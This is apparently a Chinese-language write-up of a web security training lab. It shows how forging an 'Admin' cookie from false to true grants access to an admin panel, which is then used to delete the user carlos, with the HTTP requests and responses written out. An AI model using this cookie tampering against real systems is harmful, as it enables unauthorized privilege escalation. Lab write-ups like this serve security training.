# 实验：由请求参数控制的用户角色

本实验在 `/admin` 处有一个管理员面板，它使用可伪造的 cookie 来识别管理员。

通过访问管理员面板并使用它删除用户 `carlos` 来解决本实验。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 使用凭证登录后，服务器响应
    ```http
    HTTP/2 302 Found
    Location: /my-account?id=wiener
    Set-Cookie: Admin=false; Secure; HttpOnly
    Set-Cookie: session=k2Pf4TEvi3GYh4yog4nhDvwT2zX64JhW; Secure; HttpOnly; SameSite=None
    ```
    - cookie 字段包含管理员控制信息

- 篡改管理员 cookie 头部
    ```http
    GET /my-account?id=wiener HTTP/2
    Cookie: Admin=true; session=k2Pf4TEvi3GYh4yog4nhDvwT2zX64JhW
    ```
    - 服务器响应新增管理员功能

- 在浏览器设置管理员 cookie 后，使用管理功能的删除
